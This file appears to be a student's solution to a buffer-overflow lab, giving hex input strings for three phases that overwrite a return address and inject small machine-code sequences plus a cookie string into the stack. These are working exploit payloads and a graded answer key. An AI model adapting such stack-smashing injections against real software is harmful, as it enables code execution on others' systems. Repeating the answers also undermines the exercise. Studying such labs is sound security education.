/* phase 1
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

c7 18 40 00 00 00 00 00
*/

/* phase 2
48 c7 c7 a3 b1 6b 23 68
f3 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

48 2f 64 55 00 00 00 00
*/

/* phase 3
48 c7 c7 78 2f 64 55 68
04 1a 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

48 2f 64 55 00 00 00 00

32 33 36 62 62 31 61 33
*/